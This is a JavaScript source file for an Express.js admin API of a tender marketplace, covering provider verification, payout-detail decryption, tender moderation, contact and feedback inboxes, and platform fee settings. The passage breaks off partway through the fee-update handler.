const express = require('express');
const path = require('path');
const db = require('../db');
const supabase = require('../lib/supabaseClient');
const { authenticate, authorize } = require('../middleware/auth');
const {
  sendProviderApprovedEmail,
  sendProviderRejectedEmail,
} = require('../lib/verificationEmails');
const { notifyUser, notifyChannel } = require('../lib/realtimeService');
const { sendTenderRemovedEmail } = require('../lib/tenderEmails');
const { signedUrl } = require('../lib/storageUrls');
const {
  sendDisputeResolvedClientEmail,
  sendDisputeResolvedProviderEmail,
} = require('../lib/disputeEmails');
const { jamaicaToday } = require('../lib/feeConfig');
const paymentCrypto = require('../lib/paymentCrypto');

const router = express.Router();

// All admin routes require an authenticated admin.
router.use(authenticate, authorize('admin'));

// The four known document slots. gov_id is required; the rest are optional.
const DOC_TYPES = [
  { docType: 'gov_id',       name: 'Government ID',          required: true  },
  { docType: 'trade_cert',   name: 'Trade Certificate',      required: false },
  { docType: 'insurance',    name: 'Insurance',              required: false },
  { docType: 'business_reg', name: 'Business Registration',  required: false },
];
const VALID_DOC_TYPES = DOC_TYPES.map(d => d.docType);

// Map a file extension to a coarse content type so the frontend can pick
// <img> vs <iframe> for previewing.
const contentTypeForPath = (p) => {
  const ext = path.extname(p || '').toLowerCase();
  if (ext === '.pdf') return 'application/pdf';
  if (ext === '.png') return 'image/png';
  if (ext === '.jpg' || ext === '.jpeg') return 'image/jpeg';
  if (ext === '.webp') return 'image/webp';
  if (ext === '.gif') return 'image/gif';
  return 'application/octet-stream';
};

// ============================================================
// GET /api/admin/verifications
// All submitted providers (is_onboarding_complete = TRUE) with their
// profile, services, parishes, and a derived docs[] array.
// Read via db.query (superuser) — route already gated by authorize('admin').
// ============================================================
router.get('/verifications', async (req, res) => {
  try {
    const result = await db.query(`
      SELECT
        u.id            AS provider_id,
        u.first_name,
        u.last_name,
        u.email,
        u.phone_number,
        u.parish        AS home_parish,
        p.bio,
        p.verification_status,
        p.documents,
        -- Use the latest submission (resubmission wins) so the SLA clock resets.
        COALESCE(p.resubmitted_at, p.submitted_at) AS submitted_at,
        p.resubmitted_at,
        p.rejection_reason,
        p.rejection_notes,
        p.admin_notes,
        COALESCE(
          (SELECT json_agg(COALESCE(st.display_name, ps.category::text) ORDER BY ps.created_at)
             FROM public.provider_services ps
             LEFT JOIN public.service_types st ON st.slug = ps.category::text
            WHERE ps.provider_id = u.id),
          '[]'::json
        ) AS services,
        COALESCE(
          (SELECT json_agg(pa.parish ORDER BY pa.created_at)
             FROM public.provider_parishes pa
            WHERE pa.provider_id = u.id),
          '[]'::json
        ) AS parishes,
        EXISTS (
          SELECT 1 FROM public.provider_payment_details pd
           WHERE pd.provider_id = u.id AND pd.account_number_encrypted IS NOT NULL
        ) AS has_payment_details
      FROM public.provider_profiles p
      JOIN public.users u ON u.id = p.provider_id
      WHERE p.is_onboarding_complete = TRUE
      ORDER BY COALESCE(p.resubmitted_at, p.submitted_at) ASC NULLS LAST
    `);

    const providers = result.rows.map((r) => {
      const docs = r.documents || {};
      return {
        providerId:         r.provider_id,
        name:               `${r.first_name || ''} ${r.last_name || ''}`.trim() || 'Unnamed Provider',
        firstName:          r.first_name,
        email:              r.email,
        phone:              r.phone_number || '',
        parish:             (Array.isArray(r.parishes) && r.parishes[0]) || r.home_parish || '—',
        coverageParishes:   Array.isArray(r.parishes) ? r.parishes : [],
        cats:               Array.isArray(r.services) ? r.services : [],
        bio:                r.bio || '',
        verification_status: r.verification_status,
        submittedAt:        r.submitted_at,
        rejectionReason:    r.rejection_reason,
        rejectionNotes:     r.rejection_notes,
        // A pending application that carries a prior rejection reason is a
        // resubmission — the admin sees why it was rejected last time.
        previouslyRejected: Boolean(r.resubmitted_at) && Boolean(r.rejection_reason),
        adminNotes:         r.admin_notes || '',
        hasPaymentDetails:  Boolean(r.has_payment_details),
        docs: DOC_TYPES.map(d => ({
          docType:  d.docType,
          name:     d.name,
          required: d.required,
          uploaded: Boolean(docs[d.docType]),
        })),
      };
    });

    res.json({ success: true, providers });
  } catch (err) {
    console.error('GET /api/admin/verifications error:', err);
    res.status(500).json({ success: false, message: 'Failed to load verifications.' });
  }
});

// ============================================================
// GET /api/admin/verifications/unread-count?since=<unix_ms>
// Returns count of pending verifications submitted after the given timestamp.
// Used by the sidebar badge to show how many are new since the admin last
// viewed the verification page. `since` is milliseconds since epoch (from
// localStorage). Defaults to 0 (count all pending) if omitted or invalid.
// IMPORTANT: must be declared before /:providerId routes to avoid that param
// matching the literal string "unread-count".
// ============================================================
router.get('/verifications/unread-count', async (req, res) => {
  try {
    const sinceMs = parseInt(req.query.since, 10);
    const since = !isNaN(sinceMs) && sinceMs > 0 ? new Date(sinceMs) : new Date(0);

    const result = await db.query(
      `SELECT COUNT(*)::int AS count
         FROM public.provider_profiles pp
        WHERE pp.is_onboarding_complete = TRUE
          AND pp.verification_status    = 'pending'
          AND COALESCE(pp.resubmitted_at, pp.submitted_at) > $1`,
      [since]
    );

    res.json({ success: true, count: result.rows[0].count });
  } catch (err) {
    console.error('GET /api/admin/verifications/unread-count error:', err);
    res.status(500).json({ success: false, count: 0 });
  }
});

// ============================================================
// GET /api/admin/verifications/:providerId/document/:docType
// Generate a short-lived signed URL for a private provider document.
// ============================================================
router.get('/verifications/:providerId/document/:docType', async (req, res) => {
  const { providerId, docType } = req.params;

  if (!VALID_DOC_TYPES.includes(docType)) {
    return res.status(400).json({ success: false, message: 'Invalid document type.' });
  }

  try {
    const result = await db.query(
      `SELECT documents FROM public.provider_profiles WHERE provider_id = $1`,
      [providerId]
    );

    const docs = result.rows[0]?.documents || {};
    const storagePath = docs[docType];
    if (!storagePath) {
      return res.status(404).json({ success: false, message: 'Document not uploaded.' });
    }

    const { data, error } = await supabase.storage
      .from('provider-documents')
      .createSignedUrl(storagePath, 3600); // 1 hour

    if (error || !data?.signedUrl) {
      console.error('createSignedUrl error:', error);
      return res.status(500).json({ success: false, message: 'Could not generate document link.' });
    }

    res.json({
      success: true,
      url: data.signedUrl,
      contentType: contentTypeForPath(storagePath),
    });
  } catch (err) {
    console.error('GET document signed-url error:', err);
    res.status(500).json({ success: false, message: 'Failed to load document.' });
  }
});

// ============================================================
// GET /api/admin/verifications/:providerId/payment
// Returns the provider's FULL, decrypted payout details for verification.
// Decryption happens on-demand (only when an admin explicitly opens the
// banking panel) to minimise how often plaintext exists in memory.
// Admin-only (router.use gate). Read via superuser db.query.
// ============================================================
router.get('/verifications/:providerId/payment', async (req, res) => {
  const { providerId } = req.params;
  try {
    const result = await db.query(
      `SELECT account_ownership, business_name, payee_first_name, payee_surname,
              bank_name, bank_branch, swift_code, transit_code, bank_address,
              account_type, currency, account_number_encrypted, aba_routing_encrypted
         FROM public.provider_payment_details
        WHERE provider_id = $1`,
      [providerId]
    );

    const r = result.rows[0];
    if (!r) {
      return res.status(404).json({ success: false, message: 'No payment details on file.' });
    }

    let accountNumber = null;
    let abaRouting = null;
    try {
      accountNumber = paymentCrypto.decrypt(r.account_number_encrypted);
      abaRouting = paymentCrypto.decrypt(r.aba_routing_encrypted);
    } catch (decErr) {
      console.error('Payment decrypt failed for provider', providerId, decErr.message);
      return res.status(500).json({
        success: false,
        message: 'Could not decrypt payment details. Check PAYMENT_ENCRYPTION_KEY.',
      });
    }

    res.json({
      success: true,
      payment: {
        accountOwnership: r.account_ownership,
        businessName:     r.business_name,
        payeeFirstName:   r.payee_first_name,
        payeeSurname:     r.payee_surname,
        bankName:         r.bank_name,
        bankBranch:       r.bank_branch,
        swiftCode:        r.swift_code,
        transitCode:      r.transit_code,
        bankAddress:      r.bank_address,
        accountType:      r.account_type,
        currency:         r.currency,
        accountNumber,   // decrypted
        abaRouting,      // decrypted (may be null)
      },
    });
  } catch (err) {
    console.error('GET /api/admin/verifications/:providerId/payment error:', err);
    res.status(500).json({ success: false, message: 'Failed to load payment details.' });
  }
});

// ============================================================
// POST /api/admin/verifications/:providerId/approve   body: { note? }
// ============================================================
router.post('/verifications/:providerId/approve', async (req, res) => {
  const { providerId } = req.params;
  const { note } = req.body;

  try {
    const result = await db.queryAsUser(req.user.id,
      `UPDATE public.provider_profiles
          SET verification_status = 'approved',
              is_verified         = TRUE,
              reviewed_at         = NOW(),
              reviewed_by         = $2,
              admin_notes         = COALESCE($3, admin_notes),
              updated_at          = NOW()
        WHERE provider_id = $1
        RETURNING provider_id`,
      [providerId, req.user.id, note ?? null]
    );

    if (result.rows.length === 0) {
      return res.status(404).json({ success: false, message: 'Provider not found.' });
    }

    // Fetch contact details for the email (superuser read).
    const userRes = await db.query(
      `SELECT email, first_name FROM public.users WHERE id = $1`,
      [providerId]
    );
    const u = userRes.rows[0];
    if (u?.email) {
      try {
        await sendProviderApprovedEmail(u.email, u.first_name, note);
      } catch (mailErr) {
        console.warn('Approval email failed:', mailErr.message);
      }
    }

    await notifyUser(providerId, 'verification-approved', {
      message: 'Your account has been approved! You can now receive jobs.',
    });

    res.json({ success: true, verification_status: 'approved' });
  } catch (err) {
    console.error('POST approve error:', err);
    res.status(500).json({ success: false, message: 'Failed to approve provider.' });
  }
});

// ============================================================
// POST /api/admin/verifications/:providerId/reject   body: { reason, notes? }
// ============================================================
router.post('/verifications/:providerId/reject', async (req, res) => {
  const { providerId } = req.params;
  const { reason, notes } = req.body;

  if (!reason || !String(reason).trim()) {
    return res.status(400).json({ success: false, message: 'A rejection reason is required.' });
  }

  try {
    // Append this rejection to the immutable history trail (so prior reasons
    // survive future resubmissions/re-reviews), and set the latest reason/notes.
    const result = await db.queryAsUser(req.user.id,
      `UPDATE public.provider_profiles
          SET verification_status = 'rejected',
              is_verified         = FALSE,
              reviewed_at         = NOW(),
              reviewed_by         = $2,
              rejection_reason    = $3,
              rejection_notes     = $4,
              verification_history = COALESCE(verification_history, '[]'::jsonb)
                || jsonb_build_array(jsonb_build_object(
                     'action', 'rejected',
                     'reason', $3::text,
                     'notes',  $4::text,
                     'at',     NOW(),
                     'by',     $2::uuid
                   )),
              updated_at          = NOW()
        WHERE provider_id = $1
        RETURNING provider_id`,
      [providerId, req.user.id, reason, notes ?? null]
    );

    if (result.rows.length === 0) {
      return res.status(404).json({ success: false, message: 'Provider not found.' });
    }

    const userRes = await db.query(
      `SELECT email, first_name FROM public.users WHERE id = $1`,
      [providerId]
    );
    const u = userRes.rows[0];
    if (u?.email) {
      try {
        await sendProviderRejectedEmail(u.email, u.first_name, reason, notes);
      } catch (mailErr) {
        console.warn('Rejection email failed:', mailErr.message);
      }
    }

    await notifyUser(providerId, 'verification-rejected', {
      message: 'Your verification was not approved. Check your email for details.',
      reason,
    });

    res.json({ success: true, verification_status: 'rejected' });
  } catch (err) {
    console.error('POST reject error:', err);
    res.status(500).json({ success: false, message: 'Failed to reject provider.' });
  }
});

// ============================================================
// PUT /api/admin/verifications/:providerId/note   body: { admin_notes }
// Persist internal review notes (never emailed to the provider).
// ============================================================
router.put('/verifications/:providerId/note', async (req, res) => {
  const { providerId } = req.params;
  const { admin_notes } = req.body;

  try {
    const result = await db.queryAsUser(req.user.id,
      `UPDATE public.provider_profiles
          SET admin_notes = $2, updated_at = NOW()
        WHERE provider_id = $1
        RETURNING provider_id`,
      [providerId, admin_notes ?? null]
    );

    if (result.rows.length === 0) {
      return res.status(404).json({ success: false, message: 'Provider not found.' });
    }

    res.json({ success: true });
  } catch (err) {
    console.error('PUT note error:', err);
    res.status(500).json({ success: false, message: 'Failed to save note.' });
  }
});

// ============================================================
// Admin Tender Management
// Read via db.query (superuser) — route already gated by authorize('admin').
// Tenders are addressed by their human-readable display_code (TND-####).
// ============================================================

// Prettify a raw service_category slug as a fallback title/label.
const prettifyCat = (c) =>
  (c || 'other').split('_').map((w) => w.charAt(0).toUpperCase() + w.slice(1)).join(' ');

// DB status + flags -> admin display status.
const toAdminStatus = (row) => {
  if (row.status === 'completed') return 'completed';
  if (row.has_accepted || row.status === 'in_progress') return 'awarded';
  if (row.is_expired) return 'expired';
  return 'active';
};

const QUOTE_STATUS_MAP = { pending: 'pending', accepted: 'awarded', rejected: 'rejected' };

const monthYear = (d) =>
  d ? new Date(d).toLocaleString('en-US', { month: 'short', year: 'numeric' }) : '';
const isoDate = (d) => (d ? new Date(d).toISOString().slice(0, 10) : undefined);

// Ping every provider who quoted a tender so their "My Quotes" list re-fetches
// (their quote is hidden while the tender is trashed, and returns on restore).
async function notifyQuoteProviders(tenderId) {
  const r = await db.query('SELECT DISTINCT provider_id FROM public.quotes WHERE tender_id = $1', [tenderId]);
  await Promise.allSettled(
    r.rows.map((row) => notifyUser(row.provider_id, 'quotes-updated', { tenderId }))
  );
}

// GET /api/admin/tenders — every non-draft tender in the AdminTender shape.
router.get('/tenders', async (req, res) => {
  try {
    const tRes = await db.query(`
      SELECT
        t.id AS uuid, t.display_code, t.description, t.category,
        st.display_name AS service_name,
        t.parish, t.budget_min, t.budget_max,
        t.created_at, t.preferred_start_date, t.expires_at, t.updated_at,
        t.status, t.trashed_at,
        (t.expires_at IS NOT NULL AND t.expires_at <= NOW()) AS is_expired,
        EXISTS (SELECT 1 FROM public.quotes q WHERE q.tender_id = t.id AND q.status = 'accepted') AS has_accepted,
        cu.first_name, cu.last_name, cu.email,
        cu.display_code AS client_code, cu.created_at AS client_since
      FROM public.tenders t
      LEFT JOIN public.service_types st ON st.id = t.service_type_id
      JOIN public.users cu ON cu.id = t.client_id
      WHERE t.status <> 'draft'
      ORDER BY t.created_at DESC
    `);

    const uuids = tRes.rows.map((r) => r.uuid);
    const quotesByTender = new Map();
    if (uuids.length) {
      const qRes = await db.query(`
        SELECT q.id, q.tender_id, q.amount, q.status, q.created_at,
               pu.display_code AS provider_code, pu.first_name, pu.last_name
        FROM public.quotes q
        JOIN public.users pu ON pu.id = q.provider_id
        WHERE q.tender_id = ANY($1::uuid[])
        ORDER BY q.created_at ASC
      `, [uuids]);
      for (const q of qRes.rows) {
        if (!quotesByTender.has(q.tender_id)) quotesByTender.set(q.tender_id, []);
        quotesByTender.get(q.tender_id).push(q);
      }
    }

    const tenders = tRes.rows.map((r) => {
      const rawQuotes = quotesByTender.get(r.uuid) || [];
      const quotes = rawQuotes.map((q) => ({
        pid:    q.provider_code,
        name:   `${q.first_name} ${q.last_name}`.trim(),
        amount: Math.round((q.amount || 0) / 100),
        date:   isoDate(q.created_at),
        status: QUOTE_STATUS_MAP[q.status] || 'pending',
      }));
      const accepted = rawQuotes.find((q) => q.status === 'accepted');

      return {
        id:     r.display_code,
        title:  r.service_name || prettifyCat(r.category),
        cat:    r.category,
        desc:   r.description || '',
        client: {
          name:  `${r.first_name} ${r.last_name}`.trim(),
          email: r.email,
          id:    r.client_code,
          since: monthYear(r.client_since),
        },
        location:   r.parish,
        budget_min: Math.round((r.budget_min || 0) / 100),
        budget_max: Math.round((r.budget_max || 0) / 100),
        posted:     isoDate(r.created_at),
        deadline:   isoDate(r.expires_at),
        status:     toAdminStatus(r),
        quotes,
        awarded_to: accepted
          ? { pid: accepted.provider_code, name: `${accepted.first_name} ${accepted.last_name}`.trim(), amount: Math.round((accepted.amount || 0) / 100) }
          : undefined,
        completed_date: r.status === 'completed' ? isoDate(r.updated_at) : undefined,
        trashed: r.trashed_at !== null,
      };
    });

    res.json({ success: true, tenders });
  } catch (err) {
    console.error('GET /api/admin/tenders error:', err);
    res.status(500).json({ success: false, message: 'Failed to load tenders.' });
  }
});

// GET /api/admin/tenders/active-count — count of live "Active" tenders for the
// sidebar badge (open, not admin-removed, not expired, not yet awarded) — mirrors
// the Active/Live bucket on the admin Tenders page.
router.get('/tenders/active-count', async (req, res) => {
  try {
    const r = await db.query(`
      SELECT COUNT(*)::int AS count
      FROM public.tenders t
      WHERE t.status = 'open'
        AND t.trashed_at IS NULL
        AND (t.expires_at IS NULL OR t.expires_at > NOW())
        AND NOT EXISTS (SELECT 1 FROM public.quotes q WHERE q.tender_id = t.id AND q.status = 'accepted')
    `);
    res.json({ success: true, count: r.rows[0].count });
  } catch (err) {
    console.error('GET /api/admin/tenders/active-count error:', err);
    res.status(500).json({ success: false, message: 'Failed to count tenders.' });
  }
});

// POST /api/admin/tenders/:code/trash — soft-delete (hides from browse/explore
// and marks the homeowner's copy "Rejected by admin"). Optional { reason }.
router.post('/tenders/:code/trash', async (req, res) => {
  const reason = (req.body && typeof req.body.reason === 'string')
    ? req.body.reason.trim().slice(0, 500) || null
    : null;
  try {
    const r = await db.query(
      `UPDATE public.tenders
         SET trashed_at = NOW(), trashed_reason = $2, updated_at = NOW()
       WHERE display_code = $1
       RETURNING id, client_id, display_code,
                 (SELECT display_name FROM public.service_types WHERE id = service_type_id) AS service_name,
                 category,
                 (SELECT email      FROM public.users WHERE id = client_id) AS client_email,
                 (SELECT first_name FROM public.users WHERE id = client_id) AS client_name`,
      [req.params.code, reason]
    );
    if (r.rows.length === 0) return res.status(404).json({ success: false, message: 'Tender not found.' });
    res.json({ success: true });

    // Fire-and-forget: tell the homeowner their tender was removed.
    const t = r.rows[0];
    const label = t.service_name || t.category || 'your tender';
    Promise.allSettled([
      notifyUser(t.client_id, 'tender-removed', { tenderId: t.id, displayCode: t.display_code, reason }),
      // Email the homeowner.
      t.client_email
        ? sendTenderRemovedEmail(t.client_email, { clientName: t.client_name, tenderTitle: label, tenderCode: t.display_code, reason })
        : Promise.resolve(),
      notifyUser(t.client_id, 'tenders-updated', { tenderId: t.id }),
      db.query(
        `INSERT INTO public.notifications (user_id, type, title, body, data)
         VALUES ($1, 'tender_removed', $2, $3, $4::jsonb)`,
        [
          t.client_id,
          'Your tender was removed',
          `An administrator removed your "${label}" tender (${t.display_code}).` + (reason ? ` Reason: ${reason}` : ''),
          JSON.stringify({ tenderId: t.id }),
        ]
      ),
      // Refresh the My Quotes list of every provider who quoted — their quote is now hidden.
      notifyQuoteProviders(t.id),
      // Drop it from every provider's Browse grid + recount their stats, live.
      notifyChannel('tenders-feed', 'tender-removed', { tenderId: t.id }),
    ]).catch((err) => console.warn('trash notify error:', err.message));
  } catch (err) {
    console.error('POST /api/admin/tenders/:code/trash error:', err);
    res.status(500).json({ success: false, message: 'Failed to trash tender.' });
  }
});

// POST /api/admin/tenders/:code/restore — undo soft-delete + clear the reason.
router.post('/tenders/:code/restore', async (req, res) => {
  try {
    const r = await db.query(
      `UPDATE public.tenders
         SET trashed_at = NULL, trashed_reason = NULL, updated_at = NOW()
       WHERE display_code = $1
       RETURNING id, client_id, display_code,
                 (SELECT display_name FROM public.service_types WHERE id = service_type_id) AS service_name,
                 category`,
      [req.params.code]
    );
    if (r.rows.length === 0) return res.status(404).json({ success: false, message: 'Tender not found.' });
    res.json({ success: true });

    const t = r.rows[0];
    const label = t.service_name || t.category || 'your tender';
    Promise.allSettled([
      notifyUser(t.client_id, 'tenders-updated', { tenderId: t.id }),
      db.query(
        `INSERT INTO public.notifications (user_id, type, title, body, data)
         VALUES ($1, 'tender_restored', $2, $3, $4::jsonb)`,
        [
          t.client_id,
          'Your tender was restored',
          `An administrator restored your "${label}" tender (${t.display_code}). It is live again.`,
          JSON.stringify({ tenderId: t.id }),
        ]
      ),
      // Refresh My Quotes for providers who quoted — their quote is visible again.
      notifyQuoteProviders(t.id),
      // Re-add it to providers' Browse grids + recount, live.
      notifyChannel('tenders-feed', 'tender-restored', { tenderId: t.id }),
    ]).catch((err) => console.warn('restore notify error:', err.message));
  } catch (err) {
    console.error('POST /api/admin/tenders/:code/restore error:', err);
    res.status(500).json({ success: false, message: 'Failed to restore tender.' });
  }
});

// DELETE /api/admin/tenders/:code — permanent delete (cascades quotes + photos).
router.delete('/tenders/:code', async (req, res) => {
  try {
    const r = await db.query(
      `DELETE FROM public.tenders WHERE display_code = $1 RETURNING id`,
      [req.params.code]
    );
    if (r.rows.length === 0) return res.status(404).json({ success: false, message: 'Tender not found.' });
    res.json({ success: true });
  } catch (err) {
    console.error('DELETE /api/admin/tenders/:code error:', err);
    res.status(500).json({ success: false, message: 'Failed to delete tender.' });
  }
});

// DELETE /api/admin/tenders/:code/quotes/:pid — remove a single quote (by provider code).
// One quote per (tender, provider) — uq_quotes_tender_provider — so this is unambiguous.
router.delete('/tenders/:code/quotes/:pid', async (req, res) => {
  try {
    const del = await db.query(`
      DELETE FROM public.quotes
      WHERE tender_id   = (SELECT id FROM public.tenders WHERE display_code = $1)
        AND provider_id = (SELECT id FROM public.users   WHERE display_code = $2)
      RETURNING tender_id
    `, [req.params.code, req.params.pid]);
    if (del.rows.length === 0) return res.status(404).json({ success: false, message: 'Quote not found.' });
    // Keep the denormalised counter honest.
    await db.query(
      `UPDATE public.tenders SET quotes_count = (SELECT COUNT(*) FROM public.quotes WHERE tender_id = $1)
       WHERE id = $1`,
      [del.rows[0].tender_id]
    );
    res.json({ success: true });
  } catch (err) {
    console.error('DELETE /api/admin/tenders/:code/quotes/:pid error:', err);
    res.status(500).json({ success: false, message: 'Failed to remove quote.' });
  }
});

// ============================================================
// Admin Contact Inbox
// Reads/writes public.contact_messages. The public form stores the subject
// as the exact <option> label text (see tendrlt-fe/app/contact/page.tsx);
// we map that + the homeowner/provider/other role onto the admin UI's enums.
// ============================================================

const CONTACT_ROLE_MAP = { homeowner: 'client', provider: 'provider' };
const toContactRole = (r) => CONTACT_ROLE_MAP[r] || 'other';

const CONTACT_SUBJECT_MAP = {
  'Problem with a quote': 'quote',
  'Payment or escrow issue': 'payment',
  'Provider verification': 'verification',
  'Account access': 'account',
  'Report a user': 'report',
  'Feature request': 'feature',
  'General question': 'question',
  'Other': 'other',
};
const toContactSubject = (s) => CONTACT_SUBJECT_MAP[s] || 'other';

const INBOX_STATUSES = ['new', 'read', 'resolved', 'archived'];

const shapeContactMessage = (r) => ({
  id: r.id,
  fn: r.first_name,
  ln: r.last_name || '',
  email: r.email,
  role: toContactRole(r.role),
  subject: toContactSubject(r.subject),
  msg: r.message,
  date: r.created_at.toISOString().slice(0, 10),
  status: r.status,
  trashed: r.trashed,
});

// GET /api/admin/contact-messages
router.get('/contact-messages', async (req, res) => {
  try {
    const r = await db.query(`
      SELECT id, first_name, last_name, email, role, subject, message, status, trashed, created_at
      FROM public.contact_messages
      ORDER BY created_at DESC
    `);
    res.json({ success: true, items: r.rows.map(shapeContactMessage) });
  } catch (err) {
    console.error('GET /api/admin/contact-messages error:', err);
    res.status(500).json({ success: false, message: 'Failed to load contact messages.' });
  }
});

// PATCH /api/admin/contact-messages/:id/status   body: { status }
router.patch('/contact-messages/:id/status', async (req, res) => {
  const { status } = req.body || {};
  if (!INBOX_STATUSES.includes(status)) {
    return res.status(400).json({ success: false, message: 'Invalid status.' });
  }
  try {
    const r = await db.query(
      `UPDATE public.contact_messages SET status = $2 WHERE id = $1 RETURNING id`,
      [req.params.id, status]
    );
    if (r.rows.length === 0) return res.status(404).json({ success: false, message: 'Message not found.' });
    res.json({ success: true });
  } catch (err) {
    console.error('PATCH /api/admin/contact-messages/:id/status error:', err);
    res.status(500).json({ success: false, message: 'Failed to update status.' });
  }
});

// POST /api/admin/contact-messages/:id/trash
router.post('/contact-messages/:id/trash', async (req, res) => {
  try {
    const r = await db.query(
      `UPDATE public.contact_messages SET trashed = true WHERE id = $1 RETURNING id`,
      [req.params.id]
    );
    if (r.rows.length === 0) return res.status(404).json({ success: false, message: 'Message not found.' });
    res.json({ success: true });
  } catch (err) {
    console.error('POST /api/admin/contact-messages/:id/trash error:', err);
    res.status(500).json({ success: false, message: 'Failed to trash message.' });
  }
});

// POST /api/admin/contact-messages/:id/restore
router.post('/contact-messages/:id/restore', async (req, res) => {
  try {
    const r = await db.query(
      `UPDATE public.contact_messages SET trashed = false WHERE id = $1 RETURNING id`,
      [req.params.id]
    );
    if (r.rows.length === 0) return res.status(404).json({ success: false, message: 'Message not found.' });
    res.json({ success: true });
  } catch (err) {
    console.error('POST /api/admin/contact-messages/:id/restore error:', err);
    res.status(500).json({ success: false, message: 'Failed to restore message.' });
  }
});

// DELETE /api/admin/contact-messages/:id
router.delete('/contact-messages/:id', async (req, res) => {
  try {
    const r = await db.query(`DELETE FROM public.contact_messages WHERE id = $1 RETURNING id`, [req.params.id]);
    if (r.rows.length === 0) return res.status(404).json({ success: false, message: 'Message not found.' });
    res.json({ success: true });
  } catch (err) {
    console.error('DELETE /api/admin/contact-messages/:id error:', err);
    res.status(500).json({ success: false, message: 'Failed to delete message.' });
  }
});

// ============================================================
// Admin Feedback Inbox
// Reads/writes public.feedback_submissions. The public form only ever sends
// role in {client, provider, visitor, other} and never collects a subject.
// ============================================================

const FEEDBACK_ROLE_MAP = { client: 'client', provider: 'provider', visitor: 'visitor' };
const toFeedbackRole = (r) => FEEDBACK_ROLE_MAP[r] || 'other';

const shapeFeedbackItem = (r) => ({
  id: r.id,
  cat: r.cat,
  name: r.name,
  email: r.email,
  role: toFeedbackRole(r.role),
  msg: r.message,
  rating: r.rating,
  followUp: r.follow_up,
  date: r.created_at.toISOString().slice(0, 10),
  status: r.status,
});

// GET /api/admin/feedback-submissions
router.get('/feedback-submissions', async (req, res) => {
  try {
    const r = await db.query(`
      SELECT id, cat, name, email, role, rating, follow_up, message, status, created_at
      FROM public.feedback_submissions
      ORDER BY created_at DESC
    `);
    res.json({ success: true, items: r.rows.map(shapeFeedbackItem) });
  } catch (err) {
    console.error('GET /api/admin/feedback-submissions error:', err);
    res.status(500).json({ success: false, message: 'Failed to load feedback submissions.' });
  }
});

// PATCH /api/admin/feedback-submissions/:id/status   body: { status }
router.patch('/feedback-submissions/:id/status', async (req, res) => {
  const { status } = req.body || {};
  if (!INBOX_STATUSES.includes(status)) {
    return res.status(400).json({ success: false, message: 'Invalid status.' });
  }
  try {
    const r = await db.query(
      `UPDATE public.feedback_submissions SET status = $2 WHERE id = $1 RETURNING id`,
      [req.params.id, status]
    );
    if (r.rows.length === 0) return res.status(404).json({ success: false, message: 'Submission not found.' });
    res.json({ success: true });
  } catch (err) {
    console.error('PATCH /api/admin/feedback-submissions/:id/status error:', err);
    res.status(500).json({ success: false, message: 'Failed to update status.' });
  }
});

// ============================================================
// Platform Fee Configuration (admin-only)
// Reads/writes platform_fee_config (singleton) + fee_change_history (audit).
// Every change broadcasts on 'platform-fees' so the whole app updates live.
// ============================================================

const num = (v) => (v == null ? null : parseFloat(v));

// Map a DB history row to the admin-screen HistoryEntry shape.
const shapeFeeHistory = (h) => {
  const created = new Date(h.created_at);
  return {
    id:           h.code,
    date:         created.toISOString().slice(0, 10),
    time:         created.toISOString().slice(11, 16),
    by:           h.changed_by_name || 'TendrIt Admin',
    role:         'Platform Owner',
    type:         h.type,
    old_client:   num(h.old_client),
    old_provider: num(h.old_provider),
    new_client:   num(h.new_client),
    new_provider: num(h.new_provider),
    effective:    h.effective ? new Date(h.effective).toISOString().slice(0, 10) : null,
    reason:       h.reason || '',
    status:       h.status,
    batches_applied: 0,
  };
};

async function loadFeeConfig() {
  const [cfg, hist] = await Promise.all([
    db.query('SELECT * FROM public.platform_fee_config WHERE id = 1'),
    db.query(`
      SELECT h.*, (u.first_name || ' ' || u.last_name) AS changed_by_name
      FROM public.fee_change_history h
      LEFT JOIN public.users u ON u.id = h.changed_by
      ORDER BY h.created_at ASC
    `),
  ]);
  const c = cfg.rows[0] || {};
  const day = (v) => (v ? new Date(v).toISOString().slice(0, 10) : null);
  return {
    config: {
      client_rate:   num(c.client_rate),
      provider_rate: num(c.provider_rate),
      client_effective:   day(c.client_effective),
      provider_effective: day(c.provider_effective),
      // Scheduled (pending) changes not yet in effect — null when none.
      pending_client_rate:        num(c.pending_client_rate),
      pending_client_effective:   day(c.pending_client_effective),
      pending_provider_rate:      num(c.pending_provider_rate),
      pending_provider_effective: day(c.pending_provider_effective),
      // Minimum-fee floor (cents) + toggle — managed in Advanced settings.
      min_fee_enabled:  c.min_fee_enabled !== false,
      min_client_fee:   c.min_client_fee != null ? parseInt(c.min_client_fee, 10) : 10000,
      min_provider_fee: c.min_provider_fee != null ? parseInt(c.min_provider_fee, 10) : 10000,
    },
    history: hist.rows.map(shapeFeeHistory),
  };
}

const broadcastFees = (config) =>
  notifyChannel('platform-fees', 'fees-updated', {
    clientRate: config.client_rate,
    providerRate: config.provider_rate,
  }).catch(() => {});

// GET /api/admin/fee-config — current config + full change history.
router.get('/fee-config', async (req, res) => {
  try {
    res.json({ success: true, ...(await loadFeeConfig()) });
  } catch (err) {
    console.error('GET /api/admin/fee-config error:', err);
    res.status(500).json({ success: false, message: 'Failed to load fee config.' });
  }
});

// PATCH /api/admin/fee-config { side, rate, effective, reason } — change one side.
router.patch('/fee-config', async (req, res) => {
  const { side, rate, effective, reason } = req.body || {};
  if (side !== 'client' && side !== 'provider') {
    return res.status(400).json({ success: false, message: 'side must be "client" or "provider".' });
  }
  const r = parseFloat(rate);
  if (isNaN(r) || r < 0 || r > 100) {
    return res.status(400).json({ success: false, message: 'Rate must be between 0 and 100.' });
  }
  if (!reason || !reason.trim()) {
    return res.status(400).json({ success: false, message: 'A reason is required.' });
  }
  if (!effective) {
    return res.status(400).json({ success: false, message: 'An effective date is required.' });
  }
  try {
    const cur = (await db.query('SELECT client_rate, provider_rate FROM public.platform_fee_config WHERE id = 1')).rows[0];
    const oldClient = num(cur.client_rate);
    const oldProvider = num(cur.provider_rate);
    const newClient = side === 'client' ? r : oldClient;
    const newProvider = side === 'provider' ? r : oldProvider;

    // A change effective TODAY or earlier (Jamaica) applies now; a FUTURE date
    // is parked in the pending slot and activated by the daily job on its date.
    // (side is validated to a fixed literal above — safe to interpolate.)
    const applyNow = String(effective) <= jamaicaToday();
    if (applyNow) {
      await db.query(
        `UPDATE public.platform_fee_config
            SET ${side}_rate = $1, ${side}_effective = $2,
                pending_${side}_rate = NULL, pending_${side}_effective = NULL,
                updated_at = NOW()
          WHERE id = 1`,
        [r, effective]
      );
    } else {
      await db.query(
        `UPDATE public.platform_fee_config
